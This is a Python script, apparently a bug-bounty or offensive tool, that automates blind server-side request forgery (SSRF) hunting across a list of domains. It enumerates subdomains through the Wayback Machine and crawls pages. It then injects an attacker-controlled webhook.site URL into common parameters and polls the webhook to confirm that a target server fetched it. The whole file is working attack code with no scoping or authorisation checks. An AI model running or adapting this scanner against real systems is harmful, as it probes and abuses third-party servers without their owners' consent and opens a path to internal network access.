import requests
import re
import urllib.parse
import time
import argparse
from bs4 import BeautifulSoup

WEBHOOK_ID = "53891447-43d4-495c-a18f-339426803890"
WEBHOOK_URL = f"https://webhook.site/{WEBHOOK_ID}"
WEBHOOK_API = f"https://webhook.site/token/{WEBHOOK_ID}/requests?sorting=newest"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (ssrf_hunter_pro)"
}

# Common SSRF param names to test
SSRF_PARAMS = [
    "url", "uri", "path", "continue", "data", "dest", "redirect", "next", "v",
    "image", "file", "link", "src", "load", "page", "callback", "return", "site", "open"
]

def get_subdomains(domain):
    """Fetch subdomains from web.archive.org for a domain."""
    print(f"[*] Searching web archive for subdomains of {domain}")
    subdomains = set()
    url = f"https://web.archive.org/cdx/search/cdx?url=*.{domain}/*&output=json&fl=original&collapse=urlkey"
    try:
        resp = requests.get(url, headers=HEADERS, timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            for entry in data[1:]:
                orig_url = entry[0]
                parsed = urllib.parse.urlparse(orig_url)
                hostname = parsed.hostname
                if hostname and hostname.endswith(domain):
                    subdomains.add(hostname)
    except Exception as e:
        print(f"[!] Error fetching subdomains: {e}")
    print(f"[*] Found {len(subdomains)} subdomains")
    return list(subdomains)

def crawl_urls(base_url):
    """Crawl pages of base_url to collect href links and form actions."""
    to_visit = set([base_url])
    visited = set()
    found_urls = set()

    while to_visit:
        url = to_visit.pop()
        visited.add(url)
        try:
            resp = requests.get(url, headers=HEADERS, timeout=15, allow_redirects=True)
            if resp.status_code != 200:
                continue
            soup = BeautifulSoup(resp.text, "html.parser")

            # Extract href links
            for link in soup.find_all("a", href=True):
                href = link['href']
                full_url = urllib.parse.urljoin(url, href)
                if full_url not in visited and full_url.startswith(base_url):
                    to_visit.add(full_url)
                    found_urls.add(full_url)

            # Extract form actions and build URLs to test
            for form in soup.find_all("form", action=True):
                action = form['action']
                full_action = urllib.parse.urljoin(url, action)
                found_urls.add(full_action)
        except Exception:
            continue

        # To limit crawling depth and speed:
        if len(visited) > 30:
            break

    return list(found_urls)

def test_ssrf(url, param, payload):
    """Test single URL param with SSRF payload."""
    parsed = urllib.parse.urlparse(url)
    query = urllib.parse.parse_qs(parsed.query)
    query[param] = [payload]
    new_query = urllib.parse.urlencode(query, doseq=True)
    new_url = urllib.parse.urlunparse((
        parsed.scheme,
        parsed.netloc,
        parsed.path,
        parsed.params,
        new_query,
        parsed.fragment
    ))
    try:
        resp = requests.get(new_url, headers=HEADERS, timeout=15, allow_redirects=True)
        return new_url, resp.status_code
    except Exception:
        return new_url, None

def check_webhook_for_hit():
    """Check webhook.site for incoming requests."""
    try:
        resp = requests.get(WEBHOOK_API, headers=HEADERS, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            if data.get("data") and len(data["data"]) > 0:
                return True
    except Exception:
        pass
    return False

def scan_domain(domain):
    """Scan one domain for SSRF."""
    print(f"\n[+] Scanning domain: {domain}")
    urls_to_test = []

    # Base URL test
    if not domain.startswith("http"):
        base_url = f"https://{domain}"
    else:
        base_url = domain

    urls_to_test.append(base_url)

    # Get subdomains and add to list
    subdomains = get_subdomains(domain)
    for subd in subdomains:
        urls_to_test.append(f"https://{subd}")

    # Crawl each url found for more URLs
    crawl_targets = []
    for url in urls_to_test:
        crawl_targets += crawl_urls(url)

    # Combine all unique URLs to test
    all_urls = set(urls_to_test + crawl_targets)

    # Start testing
    ssrf_found = False

    for url in all_urls:
        # Try with no params - add SSRF params
        parsed = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed.query)
        if not query_params:
            # Add a dummy param so we can test SSRF params
            for param in SSRF_PARAMS:
                test_url = f"{url}?{param}={urllib.parse.quote(WEBHOOK_URL)}"
                print(f"[*] Testing: {test_url}")
                try:
                    resp = requests.get(test_url, headers=HEADERS, timeout=15, allow_redirects=True)
                    if resp.status_code in [200, 302, 301]:
                        # Wait shortly then check webhook
                        time.sleep(5)
                        if check_webhook_for_hit():
                            print(f"[SSRF FOUND] {test_url} (param: {param})")
                            ssrf_found = True
                            break
                except Exception:
                    continue
        else:
            # If URL already has params, test SSRF param injection alongside
            for param in SSRF_PARAMS:
                test_url, status = test_ssrf(url, param, WEBHOOK_URL)
                if status and status in [200, 302, 301]:
                    print(f"[*] Tested: {test_url} => {status}")
                    time.sleep(5)
                    if check_webhook_for_hit():
                        print(f"[SSRF FOUND] {test_url} (param: {param})")
                        ssrf_found = True
                        break
            if ssrf_found:
                break
        if ssrf_found:
            break

    if not ssrf_found:
        print(f"[SSRF NOT FOUND] {domain}")

def main():
    parser = argparse.ArgumentParser(description="SSRF Hunter Pro with webhook verification")
    parser.add_argument("--list", required=True, help="File with list of domains")
    parser.add_argument("--blind", required=True, help="Webhook URL to confirm SSRF")
    args = parser.parse_args()

    global WEBHOOK_URL, WEBHOOK_API
    WEBHOOK_URL = args.blind.rstrip("/")
    # Extract webhook id from URL
    match = re.search(r"https://webhook.site/([a-f0-9\-]+)", WEBHOOK_URL)
    if match:
        WEBHOOK_ID = match.group(1)
        WEBHOOK_API = f"https://webhook.site/token/{WEBHOOK_ID}/requests?sorting=newest"
    else:
        print("[!] Invalid webhook URL format.")
        return

    with open(args.list, "r") as f:
        domains = [line.strip() for line in f if line.strip()]

    for domain in domains:
        scan_domain(domain)
        print("-" * 50)

if __name__ == "__main__":
    main()
